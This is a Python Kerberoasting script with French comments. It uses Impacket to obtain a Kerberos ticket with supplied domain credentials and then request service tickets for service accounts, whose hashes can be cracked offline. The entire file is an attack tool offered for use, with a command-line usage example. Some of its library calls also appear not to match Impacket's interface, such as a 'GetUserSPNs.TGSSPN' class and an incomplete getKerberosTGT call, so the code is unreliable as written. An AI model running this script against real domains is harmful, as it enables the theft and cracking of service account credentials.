from impacket.examples import GetUserSPNs
from impacket import version
from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
from impacket.krb5.types import Principal
import argparse
import sys

def kerberoast(domain, username, password):
    # Configuration de l'authentification Kerberos
    clientName = Principal(username, type=Principal.USER_PRINCIPAL_NAME)
    domain, username, password = domain, username, password

    # Récupération du TGT
    tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(clientName, password, domain)

    # Définition des arguments pour GetUserSPNs
    class Options:
        def __init__(self):
            self.domain = domain
            self.request = True
            self.k = False
            self.dc_ip = None
            self.hash = None
            self.aesKey = None
            self.outputfile = None
            self.user = None

    options = Options()

    # Initialisation de GetUserSPNs avec les options configurées
    spnScanner = GetUserSPNs.TGSSPN(options, username, password, domain, tgt, cipher, oldSessionKey, sessionKey)
    spnScanner.run()

if __name__ == '__main__':
    parser = argparse.ArgumentParser(add_help=True, description="Kerberoasting with Impacket")
    parser.add_argument('-d', '--domain', action='store', metavar="domain.com", help='Domain name')
    parser.add_argument('-u', '--username', action='store', help='Username')
    parser.add_argument('-p', '--password', action='store', help='Password')

    if len(sys.argv) == 1:
        parser.print_help()
        print("\nExample: python kerberoast.py -d domain.com -u username -p password")
        sys.exit(1)

    options = parser.parse_args()
    kerberoast(options.domain, options.username, options.password)
